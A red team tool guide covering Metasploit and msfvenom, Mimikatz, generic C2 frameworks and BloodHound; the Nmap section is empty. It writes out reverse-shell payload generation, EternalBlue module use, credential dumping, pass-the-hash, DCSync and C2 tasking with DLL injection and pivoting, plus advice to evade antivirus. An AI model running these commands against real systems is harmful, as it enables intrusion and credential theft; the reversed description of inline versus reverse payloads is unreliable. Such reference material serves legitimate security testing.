# Red Team Tools Documentation

This document provides detailed usage guides for various red team tools, covering installation, basic usage, and advanced techniques.

## 1. Nmap (Network Mapper)



## 2. Metasploit Framework

The Metasploit Framework is a powerful open-source penetration testing platform that enables security professionals to develop, test, and execute exploits against remote target systems. It comes with a vast database of exploits, payloads, and auxiliary modules, making it an indispensable tool for red team operations.

### Installation

Metasploit is pre-installed on Kali Linux and Parrot OS. For other systems, you can follow the official installation guide:

*   **Linux (Official Installer):**
    ```bash
    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \ 
    chmod 755 msfinstall && \ 
    ./msfinstall
    ```

### Basic Usage (msfconsole)

`msfconsole` is the primary interface for interacting with the Metasploit Framework.

*   **Start msfconsole:**
    ```bash
    msfconsole
    ```

*   **Search for Modules:** You can search for exploits, payloads, auxiliary modules, and post-exploitation modules.
    ```
    search <keyword>
    search type:exploit platform:windows cve:2017
    search name:eternalblue
    ```

*   **Use a Module:** Select a module to interact with.
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    use auxiliary/scanner/smb/smb_version
    use payload/windows/meterpreter/reverse_tcp
    ```

*   **Show Options:** Display the configurable options for the currently selected module.
    ```
    show options
    ```

*   **Set Options:** Configure the module's parameters. Common options include `RHOSTS` (target IP), `LHOST` (attacker IP), `LPORT` (attacker port), `PAYLOAD`.
    ```
    set RHOSTS 192.168.1.100
    set LHOST 192.168.1.5
    set LPORT 4444
    set PAYLOAD windows/meterpreter/reverse_tcp
    ```

*   **Show Payloads:** List compatible payloads for the current exploit.
    ```
    show payloads
    ```

*   **Show Targets:** List available targets for the current exploit.
    ```
    show targets
    ```

*   **Run/Exploit:** Execute the module.
    ```
    exploit
    run
    ```

### Meterpreter (Post-Exploitation Shell)

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection. It provides a powerful command-line interface for post-exploitation activities.

*   **Basic Meterpreter Commands:**
    *   `sysinfo`: Display system information.
    *   `getuid`: Get the current user ID.
    *   `pwd`: Print working directory.
    *   `ls`/`dir`: List directory contents.
    *   `cd`: Change directory.
    *   `upload <local_file> <remote_path>`: Upload a file to the target.
    *   `download <remote_file> <local_path>`: Download a file from the target.
    *   `shell`: Drop into a native system shell (cmd.exe or bash).
    *   `execute -f <program.exe>`: Execute a program.
    *   `ps`: List running processes.
    *   `migrate <pid>`: Migrate the Meterpreter session to another process.
    *   `getsystem`: Attempt to elevate privileges to SYSTEM.
    *   `hashdump`: Dump password hashes from the SAM database (Windows).
    *   `screenshot`: Take a screenshot of the target desktop.
    *   `keyscan_start`/`keyscan_dump`: Start/dump keystrokes.
    *   `webcam_list`/`webcam_snap`: List/snap webcam.

### Auxiliary Modules

Auxiliary modules perform various scanning, sniffing, and fuzzing tasks that are not directly exploits.

*   **Example Auxiliary Modules:**
    *   `auxiliary/scanner/smb/smb_login`: Brute-force SMB logins.
    *   `auxiliary/scanner/http/http_version`: Detect HTTP server versions.
    *   `auxiliary/scanner/ftp/ftp_version`: Detect FTP server versions.

### Payloads

Payloads are the code that runs on the target system after successful exploitation. Metasploit offers various types of payloads:

*   **Staged vs. Stageless:** Staged payloads are smaller and download the rest of the payload in stages, while stageless payloads are larger but self-contained.
*   **Inline vs. Reverse:** Inline payloads connect back to the attacker, while reverse payloads listen for incoming connections from the attacker.
*   **Non-Meterpreter Payloads:** Shells (cmd, bash), VNC, etc.

### Msfvenom (Payload Generation)

`msfvenom` is a standalone payload generator that combines `msfpayload` and `msfencode`.

*   **Generate a Windows Reverse TCP Meterpreter executable:**
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o /tmp/shell.exe
    ```
*   **Generate a Linux Reverse Shell ELF:**
    ```bash
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o /tmp/shell.elf
    ```
*   **Generate a Python Reverse Shell:**
    ```bash
    msfvenom -p python/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o /tmp/shell.py
    ```

Metasploit is a vast framework, and this documentation covers only the basics. For more in-depth usage, refer to the official Metasploit documentation and various online resources.



## 3. Mimikatz

Mimikatz is an open-source tool that allows attackers to extract sensitive information, such as plaintext passwords, NTLM hashes, Kerberos tickets, and certificates, from Windows memory. It is a crucial tool for credential access and lateral movement in Windows environments.

### Installation

Mimikatz can be downloaded from its official GitHub repository. It is often flagged by antivirus software due to its legitimate use by attackers, so it might need to be run in a controlled environment or with antivirus disabled.

*   **Download:**
    ```
    git clone https://github.com/gentilkiwi/mimikatz.git
    ```
    Or download pre-compiled binaries from the releases page.

### Basic Usage

Mimikatz is typically run from an elevated command prompt (Administrator privileges).

*   **Run Mimikatz:**
    ```powershell
    mimikatz.exe
    ```

*   **Enable Debug Privilege:** This is often required for Mimikatz to access process memory.
    ```
    privilege::debug
    ```

*   **Extract Passwords (plaintext, hashes, Kerberos):**
    ```
    sekurlsa::logonpasswords
    ```

*   **Extract Kerberos Tickets:**
    ```
    kerberos::list
    kerberos::golden
    ```

*   **Pass-the-Hash (PTH):** Authenticate to a remote system using an NTLM hash.
    ```
    sekurlsa::pth /user:username /domain:domain /ntlm:hash /run:"cmd.exe"
    ```

*   **Pass-the-Ticket (PTT):** Inject a Kerberos ticket into the current session.
    ```
    kerberos::ptt <base64_ticket_blob>
    ```

*   **DCSync:** Simulate a Domain Controller to request password hashes for any user.
    ```
    lsadump::dcsync /domain:domain.local /user:user_to_dump
    ```

### Advanced Techniques

*   **MiniDump:** Dump the LSASS process memory for offline analysis.
    ```
    sekurlsa::minidump <pid>
    ```
    Then use `sekurlsa::logonpasswords` on the dumped file:
    ```
    mimikatz.exe "log minidump.log" "sekurlsa::minidump <path_to_lsass.dmp>" "sekurlsa::logonpasswords" exit
    ```

*   **Bypassing Antivirus:** Mimikatz is often detected by AV. Techniques like obfuscation, reflective DLL injection, or using custom builds might be necessary to bypass detection.

Mimikatz is an extremely powerful tool for Windows post-exploitation. Its capabilities extend beyond just password extraction, making it a staple in red team operations.



## 4. Command and Control (C2) Frameworks (Conceptual)

Command and Control (C2) frameworks are essential for red team operations, providing a centralized platform to manage compromised systems, execute commands, and exfiltrate data covertly. While specific commands and features vary between frameworks, the underlying concepts remain similar. This section will cover conceptual usage, drawing examples from popular frameworks like Cobalt Strike and Mythic.

### Core C2 Concepts

*   **Beacon/Agent:** The payload deployed on the compromised host that communicates back to the C2 server.
*   **Listener:** A component on the C2 server that waits for incoming connections from beacons/agents.
*   **C2 Profile/Malleable C2:** Configuration files that define how the beacon communicates (e.g., HTTP, HTTPS, DNS, SMB), allowing for custom traffic patterns to evade detection.
*   **Staging:** The process of delivering the full payload to the compromised host in stages, often to reduce the initial payload size and evade detection.
*   **Tasks:** Commands or actions sent from the C2 server to the beacon/agent for execution.
*   **Pivoting:** Using a compromised host as a jump point to access other systems within the internal network.

### General Workflow

1.  **Set up Listener:** Configure the C2 server to listen for incoming connections on a specific port and protocol.
    *   *Example (Conceptual):*
        ```
        listener add --name http_beacon --port 80 --profile /path/to/http_profile.profile
        ```

2.  **Generate Payload:** Create a beacon/agent payload that connects back to the configured listener. This payload can be an executable, DLL, PowerShell script, etc.
    *   *Example (Conceptual):*
        ```
        payload generate --listener http_beacon --format exe --output /tmp/beacon.exe
        ```

3.  **Deliver Payload:** Get the generated payload onto the target system (e.g., via phishing, exploiting a vulnerability, or physical access).

4.  **Gain Session/Beacon:** Once the payload executes, it establishes a connection back to the C2 server, and a new session/beacon appears in the C2 framework.

5.  **Interact with Session:** Begin issuing commands and performing post-exploitation activities through the C2 framework.
    *   *Example (Conceptual - Common Commands):*
        ```
        # List active sessions
        sessions

        # Interact with a specific session (e.g., session ID 1)
        interact 1

        # Execute a shell command
        shell whoami
        shell ipconfig /all

        # Upload a file
        upload /local/path/tool.exe C:\Windows\Temp\tool.exe

        # Download a file
        download C:\Users\Public\Documents\sensitive.zip /local/path/

        # List processes
        ps

        # Migrate to another process
        migrate <pid>

        # Take a screenshot
        screenshot

        # Inject a DLL into a process
        inject <pid> /path/to/malicious.dll

        # Perform internal network scanning (via beacon)
        portscan 192.168.1.0/24 445,3389

        # Pivoting (e.g., SOCKS proxy through beacon)
        socks 1080
        ```

### Key Features of C2 Frameworks

*   **Evasion:** Techniques to bypass antivirus, EDR, and network detection systems (e.g., custom C2 profiles, obfuscation, process injection).
*   **Tasking:** Ability to queue commands for beacons that are not currently connected.
*   **Data Staging/Exfiltration:** Securely transfer data in and out of the target network.
*   **Pivoting/Tunneling:** Create network tunnels through compromised hosts to access internal network segments.
*   **Modularity:** Support for custom modules and scripts to extend functionality.
*   **Reporting:** Generate detailed logs and reports of the engagement.

Understanding the conceptual operation of C2 frameworks is crucial for effective red teaming, regardless of the specific tool used. Operators should always prioritize stealth and adaptability in their C2 infrastructure.



## 5. BloodHound

BloodHound is a single-page JavaScript web application, built on top of a Neo4j database, designed to reveal the hidden and often unintended relationships within an Active Directory environment. Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. Defenders can use BloodHound to identify and remediate those same attack paths.

### Installation

BloodHound consists of two main components: the BloodHound GUI (a desktop application) and a Neo4j graph database. The data is collected using a C# ingestor called SharpHound.

1.  **Install Neo4j:**
    *   Download Neo4j Desktop from [neo4j.com/download](https://neo4j.com/download/).
    *   Install and set up a new local graph database.

2.  **Install BloodHound GUI:**
    *   Download the latest release from the [BloodHound GitHub repository](https://github.com/BloodHoundAD/BloodHound/releases).
    *   Extract the archive and run the executable.

3.  **Download SharpHound:**
    *   Download the latest SharpHound.exe from the [BloodHound GitHub repository releases page](https://github.com/BloodHoundAD/BloodHound/releases).

### Data Collection (SharpHound)

SharpHound is the data collector for BloodHound. It can be run on a domain-joined Windows machine with a domain user account.

*   **Basic Collection (Recommended):** Collects essential data for most analyses.
    ```powershell
    SharpHound.exe -c All
    ```
*   **Specific Collection Options:**
    *   `-c All`: Collects all available data (default).
    *   `-c Group,Session,ACL,Container,GPO,Trust,OU,SPN,LocalGroup,RDP,DCOM,LoggedOn,ObjectProps,DCOnly`: Collects specific data types.
    *   `-d <DomainName>`: Specify the domain to collect from.
    *   `-u <Username> -p <Password>`: Specify credentials for collection (if not running as a domain user).
    *   `-o <OutputFileName>`: Specify output file name (default is a zip file).

After collection, a `.zip` file containing JSON files will be generated. This file needs to be imported into the BloodHound GUI.

### Basic Usage (BloodHound GUI)

1.  **Start Neo4j:** Ensure your Neo4j database is running.
2.  **Launch BloodHound GUI:** Open the BloodHound application.
3.  **Connect to Database:** Enter the Neo4j credentials (default: `neo4j`/`neo4j`).
4.  **Upload Data:** Click the `Upload Data` button (up arrow icon) and select the `.zip` file generated by SharpHound.

### Common BloodHound Queries

BloodHound uses Cypher query language. The GUI provides many built-in queries.

*   **Find Shortest Path to Domain Admins:**
    *   `Shortest Path to Domain Admins` (Built-in query)
*   **Find Users with DCSync Rights:**
    *   `Find Principals with DCSync Rights` (Built-in query)
*   **Find Computers where a User is Admin:**
    ```cypher
    MATCH (u:User {name:'<USERNAME>@<DOMAIN.COM>'}), (c:Computer)
    WHERE (u)-[:AdminTo]->(c)
    RETURN u,c
    ```
*   **Find Unconstrained Delegation:**
    *   `Find Unconstrained Delegation` (Built-in query)
*   **Find Kerberoastable Users:**
    *   `Find Kerberoastable Users` (Built-in query)

### Analysis and Interpretation

BloodHound visualizes attack paths as graphs, making it easy to identify:

*   **High-Value Targets:** Domain Admins, Enterprise Admins, critical servers.
*   **Privilege Escalation Paths:** How a low-privileged user can gain higher privileges.
*   **Lateral Movement Paths:** How an attacker can move from one compromised system to another.
*   **Misconfigurations:** ACLs, GPOs, and other settings that create vulnerabilities.

BloodHound is an indispensable tool for understanding and exploiting Active Directory environments, providing a clear visual representation of complex relationships and often hidden relationships. It is crucial for both red teamers planning attacks and blue teamers defending against them.

